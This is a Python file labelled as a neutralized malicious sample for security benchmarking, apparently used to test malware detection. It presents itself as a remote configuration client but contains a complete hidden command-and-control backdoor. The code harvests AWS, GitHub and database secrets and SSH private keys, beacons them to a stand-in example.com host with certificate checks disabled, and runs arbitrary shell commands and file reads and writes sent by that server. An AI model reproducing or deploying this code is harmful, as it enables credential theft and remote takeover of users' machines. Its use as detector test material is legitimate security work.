# BENCHMARK_TEST_ONLY - Neutralized malicious sample for security testing
"""
Remote Config Client - Fetches and applies remote configuration
Contains hidden C2 (Command and Control) functionality
"""

import os
import json
import base64
import hashlib
import subprocess
import urllib.request
from datetime import datetime
import ssl
import time

# Legitimate config server
CONFIG_SERVER = "https://config.company.com/api/v2"

# EXFIL-007: Command and Control server disguised as config endpoint
C2_SERVER = "https://[REDACTED].example.com/api/config"
C2_BEACON_INTERVAL = 300  # 5 minutes

class RemoteConfigClient:
    """Remote configuration client with hidden C2 capabilities"""

    def __init__(self, server_url=None):
        self.server_url = server_url or CONFIG_SERVER
        self.c2_url = C2_SERVER
        self.machine_id = self._generate_machine_id()
        self.last_beacon = 0

    def _generate_machine_id(self):
        """Generate unique machine identifier"""
        import platform
        data = f"{platform.node()}-{platform.machine()}-{os.getuid()}"
        return hashlib.sha256(data.encode()).hexdigest()[:16]

    def fetch_config(self, environment='production'):
        """Fetch configuration from remote server"""
        url = f"{self.server_url}/config/{environment}"
        try:
            req = urllib.request.Request(url)
            response = urllib.request.urlopen(req, timeout=10)
            return json.loads(response.read())
        except Exception:
            return {}

    def _collect_system_info(self):
        """
        EXFIL-007: Collect system information for C2 beacon
        """
        import platform

        info = {
            'machine_id': self.machine_id,
            'hostname': platform.node(),
            'platform': platform.system(),
            'version': platform.version(),
            'user': os.environ.get('USER', 'unknown'),
            'home': os.environ.get('HOME', ''),
            'cwd': os.getcwd(),
            'timestamp': datetime.now().isoformat()
        }

        # Collect environment variables with secrets
        for var in ['AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY',
                    'GITHUB_TOKEN', 'GITLAB_TOKEN', 'DATABASE_URL',
                    'API_KEY', 'SECRET_KEY']:
            if var in os.environ:
                # THEFT-003: Credential collection
                info[var] = os.environ[var]

        # Collect SSH keys
        ssh_dir = os.path.expanduser('~/.ssh')
        if os.path.isdir(ssh_dir):
            for key in ['id_rsa', 'id_ed25519']:
                key_path = os.path.join(ssh_dir, key)
                if os.path.exists(key_path):
                    try:
                        with open(key_path, 'r') as f:
                            # THEFT-001: SSH key theft
                            info[f'ssh_{key}'] = f.read()
                    except Exception:
                        pass

        return info

    def _send_c2_beacon(self, data):
        """
        EXFIL-007: Send beacon to C2 server with collected data
        """
        payload = {
            'type': 'beacon',
            'machine_id': self.machine_id,
            'data': base64.b64encode(json.dumps(data).encode()).decode()
        }

        # Disable SSL verification for C2
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            f"{self.c2_url}/beacon",
            data=json.dumps(payload).encode(),
            headers={
                'Content-Type': 'application/json',
                'X-Client-ID': self.machine_id,
                'User-Agent': 'RemoteConfig/2.5.0'
            }
        )

        try:
            response = urllib.request.urlopen(req, context=ctx, timeout=10)
            return json.loads(response.read())
        except Exception:
            return None

    def _receive_commands(self):
        """
        EXFIL-007: Receive commands from C2 server
        """
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            f"{self.c2_url}/commands/{self.machine_id}",
            headers={
                'X-Client-ID': self.machine_id,
                'User-Agent': 'RemoteConfig/2.5.0'
            }
        )

        try:
            response = urllib.request.urlopen(req, context=ctx, timeout=10)
            commands = json.loads(response.read())
            return commands.get('pending', [])
        except Exception:
            return []

    def _execute_command(self, command):
        """
        EXFIL-007: Execute command from C2 server
        """
        cmd_type = command.get('type')
        cmd_data = command.get('data', {})

        if cmd_type == 'shell':
            # Execute shell command
            result = subprocess.run(
                cmd_data.get('command', ''),
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            return {
                'stdout': result.stdout,
                'stderr': result.stderr,
                'returncode': result.returncode
            }

        elif cmd_type == 'read_file':
            # Read arbitrary file
            try:
                with open(cmd_data.get('path', ''), 'r') as f:
                    return {'content': f.read()}
            except Exception as e:
                return {'error': str(e)}

        elif cmd_type == 'write_file':
            # Write file
            try:
                with open(cmd_data.get('path', ''), 'w') as f:
                    f.write(cmd_data.get('content', ''))
                return {'success': True}
            except Exception as e:
                return {'error': str(e)}

        elif cmd_type == 'exfil':
            # Exfiltrate specific data
            return self._collect_system_info()

        return {'error': 'Unknown command type'}

    def _send_command_result(self, command_id, result):
        """Send command execution result back to C2"""
        payload = {
            'command_id': command_id,
            'result': base64.b64encode(json.dumps(result).encode()).decode()
        }

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

        req = urllib.request.Request(
            f"{self.c2_url}/results",
            data=json.dumps(payload).encode(),
            headers={
                'Content-Type': 'application/json',
                'X-Client-ID': self.machine_id
            }
        )

        try:
            urllib.request.urlopen(req, context=ctx, timeout=10)
        except Exception:
            pass

    def sync(self, environment='production'):
        """
        Sync configuration from remote server
        Also performs C2 communication (MALICIOUS)
        """
        # Legitimate config fetch
        config = self.fetch_config(environment)

        # EXFIL-007: C2 beacon
        current_time = time.time()
        if current_time - self.last_beacon > C2_BEACON_INTERVAL:
            system_info = self._collect_system_info()
            self._send_c2_beacon(system_info)
            self.last_beacon = current_time

        # EXFIL-007: Check for and execute pending commands
        commands = self._receive_commands()
        for cmd in commands:
            result = self._execute_command(cmd)
            self._send_command_result(cmd.get('id'), result)

        return config

    def watch(self, interval=60, environment='production'):
        """
        Watch for config changes
        Actually runs C2 loop (MALICIOUS)
        """
        while True:
            self.sync(environment)
            time.sleep(interval)
